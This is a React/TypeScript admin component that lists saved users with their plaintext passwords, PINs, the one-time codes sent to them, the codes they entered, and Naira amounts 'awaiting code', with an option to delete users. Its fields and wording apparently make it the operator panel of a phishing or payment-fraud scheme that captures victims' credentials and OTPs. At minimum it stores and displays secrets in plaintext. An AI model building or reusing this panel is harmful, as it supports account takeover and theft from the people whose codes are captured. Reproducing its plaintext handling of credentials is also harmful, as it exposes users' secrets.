import { Trash2 } from 'lucide-react';
import { useState } from 'react';
import Modal from '@/components/Modal';
import { useAdminRequest } from '@/hooks/useAdminRequest';
import { adminRequest, type AppUser } from '@/lib/api';
import { formatAmount, formatDateTime } from '@/lib/format';
import { errorTextClass } from '@/lib/styles';

interface AdminUsersProps {
  password: string;
}

export default function AdminUsers({ password }: AdminUsersProps) {
  const { data, setData, loading, error } = useAdminRequest<{ users: AppUser[] }>(password, 'users');
  const [pendingDelete, setPendingDelete] = useState<AppUser | null>(null);
  const [deleting, setDeleting] = useState(false);
  const [deleteError, setDeleteError] = useState<string | null>(null);

  const users = data?.users ?? [];

  const closeDeleteDialog = () => {
    if (deleting) return;
    setPendingDelete(null);
    setDeleteError(null);
  };

  const handleDelete = async () => {
    if (!pendingDelete || !data) return;
    setDeleting(true);
    setDeleteError(null);
    try {
      await adminRequest(password, 'delete-user', { id: pendingDelete.id });
      setData({ users: data.users.filter((user) => user.id !== pendingDelete.id) });
      setPendingDelete(null);
    } catch (err) {
      setDeleteError(err instanceof Error ? err.message : 'Could not delete this user.');
    } finally {
      setDeleting(false);
    }
  };

  return (
    <div className="space-y-4">
      {error && <p className={errorTextClass}>{error}</p>}

      {!data && loading && <p className="text-sm text-slate-600 dark:text-slate-400">Loading users...</p>}

      {data &&
        (users.length === 0 ? (
          <p className="px-5 py-10 text-center text-sm text-slate-600 dark:text-slate-400">No saved users yet.</p>
        ) : (
          <ul className="divide-y divide-slate-200 overflow-hidden rounded-2xl border border-slate-200 dark:divide-slate-700 dark:border-slate-700">
            {users.map((user) => (
              <li key={user.id} className="flex items-center justify-between gap-4 px-5 py-4">
                <div className="min-w-0 space-y-1.5">
                  <p className="truncate font-semibold text-slate-900 dark:text-slate-50">{user.username}</p>
                  <p className="text-sm text-slate-600 dark:text-slate-400">
                    Password: <span className="break-all font-mono text-slate-900 dark:text-slate-100">{user.password}</span>
                  </p>
                  <p className="text-sm text-slate-600 dark:text-slate-400">
                    PIN:{' '}
                    {user.pin ? (
                      <span className="font-mono tracking-widest text-slate-900 dark:text-slate-100">{user.pin}</span>
                    ) : (
                      <span className="text-slate-400">Not set</span>
                    )}
                  </p>
                  <p className="text-sm text-slate-600 dark:text-slate-400">
                    Code sent:{' '}
                    {user.verification_code ? (
                      <span className="font-mono tracking-widest text-slate-900 dark:text-slate-100">
                        {user.verification_code}
                      </span>
                    ) : (
                      <span className="text-slate-400">None</span>
                    )}
                  </p>
                  <p className="text-sm text-slate-600 dark:text-slate-400">
                    Code entered:{' '}
                    {user.entered_code ? (
                      <span className="font-mono tracking-widest text-slate-900 dark:text-slate-100">
                        {user.entered_code}
                      </span>
                    ) : (
                      <span className="text-slate-400">Not entered</span>
                    )}
                    {user.entered_code_at && (
                      <span className="text-slate-500 dark:text-slate-500"> · {formatDateTime(user.entered_code_at)}</span>
                    )}
                  </p>
                  {user.pending_amount !== null && (
                    <p className="text-sm font-medium text-amber-700 dark:text-amber-300">
                      Awaiting code for ₦{formatAmount(user.pending_amount)}
                    </p>
                  )}
                </div>
                <button
                  type="button"
                  onClick={() => setPendingDelete(user)}
                  aria-label={`Delete ${user.username}`}
                  className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-slate-500 transition hover:bg-red-50 hover:text-red-600 focus:outline-none focus-visible:ring-4 focus-visible:ring-red-500/30 dark:text-slate-400 dark:hover:bg-red-950/50 dark:hover:text-red-400"
                >
                  <Trash2 size={18} />
                </button>
              </li>
            ))}
          </ul>
        ))}

      {pendingDelete && (
        <Modal onClose={closeDeleteDialog}>
          <div className="text-center">
            <h3 className="text-xl font-semibold text-slate-900 dark:text-slate-50">Delete this user?</h3>
            <p className="mx-auto mt-3 max-w-xs text-sm text-slate-600 dark:text-slate-400">
              This removes <span className="font-semibold text-slate-900 dark:text-slate-100">{pendingDelete.username}</span>
              {' '}and their saved password and PIN. Their past claims are kept.
            </p>
          </div>
          {deleteError && <p className={`mt-4 text-center ${errorTextClass}`}>{deleteError}</p>}
          <div className="mt-8 grid grid-cols-2 gap-3">
            <button
              type="button"
              onClick={closeDeleteDialog}
              disabled={deleting}
              className="w-full rounded-2xl border border-slate-300 bg-white px-4 py-3.5 font-semibold text-slate-700 transition hover:bg-slate-50 disabled:opacity-50 dark:border-slate-700 dark:bg-slate-900 dark:text-slate-200 dark:hover:bg-slate-800"
            >
              Cancel
            </button>
            <button
              type="button"
              onClick={handleDelete}
              disabled={deleting}
              className="w-full rounded-2xl bg-red-600 px-4 py-3.5 font-semibold text-white shadow-lg shadow-red-900/20 transition hover:bg-red-500 disabled:opacity-50"
            >
              {deleting ? 'Deleting...' : 'Delete'}
            </button>
          </div>
        </Modal>
      )}
    </div>
  );
}
